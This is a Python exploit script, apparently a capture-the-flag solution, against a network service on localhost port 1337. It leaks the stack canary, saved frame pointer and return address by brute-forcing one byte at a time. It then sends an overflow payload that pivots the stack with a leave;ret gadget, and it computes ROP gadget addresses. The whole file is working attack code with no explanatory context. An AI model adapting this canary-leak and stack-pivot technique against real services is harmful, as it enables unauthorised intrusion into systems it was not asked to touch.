import socket
import struct

Ds = 0x0d0d0d0d0d0d0d0d

def p64(s):
    return struct.pack("Q", s)

def unpack(s):
    return struct.unpack("Q", s)[0]

SERVER = ("localhost", 1337)

def send_payload(p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(SERVER)
    s.recv(4096)
    s.send(p)

    res = False
    try:
        line = s.recv(4096)
        res = "Username found!" in line

    finally:
        s.close()

    return res

def leak_next_byte(prefix):
    for test_byte in [chr(t) for t in range(256)]:
        if send_payload(prefix + test_byte):
            print "Found:", hex(ord(test_byte))
            return prefix + test_byte

def leak_n_bytes(prefix, n):
    payload = prefix
    for i in range(n):
        payload = leak_next_byte(payload)
    return unpack(payload[-8:]) ^ Ds

def main():
    payload = "davide"
    payload += "B" * (1032 - len(payload))

    print "Leaking canary", 
    canary = 0xc68342c2b57a9500 # leak_n_bytes(payload, 8)
    print "{}".format(hex(canary))

    print "Leaking old RBP"
    old_rbp = 0x7fffffffe590 # leak_n_bytes(payload + p64(canary ^ Ds) , 8)
    print "{}".format(hex(old_rbp))

    print "Leaking return address"
    ret_addr = 0x555555554ecf # leak_n_bytes(payload + p64(canary ^ Ds) + p64(old_rbp ^ Ds) + chr(ord("\xcf") ^ 0xd), 7)
    print "{}".format(hex(ret_addr))

    text_section_base = ret_addr & 0xfffffffffffff000
    text_section_leave_ret = text_section_base + 0xc5c
    buffer_addr       = old_rbp - 0x480

    gadget_pop_rsi_pop_r15_ret = text_section_base + 0xf71
    gadget_pop_rdi_ret         = text_section_base + 0xf73
    gadget_pop_rdx_ret         = text_section_base + 0xb53


    # After leaking the necessary values,
    # We create a new payload
    payload = "davide" + "AA"
    payload += p64(0xdeadbeefdeadbeef ^ Ds)

    # Pad to the end of buffer
    payload += "B" * (1032 - len(payload))

    payload += p64(canary ^ Ds)
    payload += p64(buffer_addr ^ Ds)
    payload += p64(text_section_leave_ret ^ Ds)

    send_payload(payload)

if __name__ == "__main__":
    main()